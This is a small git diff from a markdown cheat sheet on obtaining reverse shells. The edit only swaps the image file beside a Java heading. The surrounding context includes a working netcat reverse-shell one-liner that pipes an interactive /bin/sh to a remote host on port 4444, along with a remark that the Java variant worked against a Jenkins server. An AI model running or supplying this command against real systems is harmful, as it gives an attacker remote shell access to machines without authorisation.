@@ -49,7 +49,7 @@ Since there is multiple different versions of netcat, the syntax can be differen
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
 ```
   
-## Java &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/java.jpg" width="40"/>
+## Java &nbsp; <img src="https://raw.githubusercontent.com/syriusbughunt/Getting_Reverse_Shell/master/img/java1.jpg" width="40"/>
 Tried it on a Jenkins local server and works like a charm
   
 ```
